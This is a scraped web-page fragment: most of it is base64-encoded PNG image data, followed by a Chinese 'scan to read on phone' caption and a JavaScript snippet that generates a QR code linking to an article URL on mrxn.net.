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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-Accept-XmlHttp-sqli-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 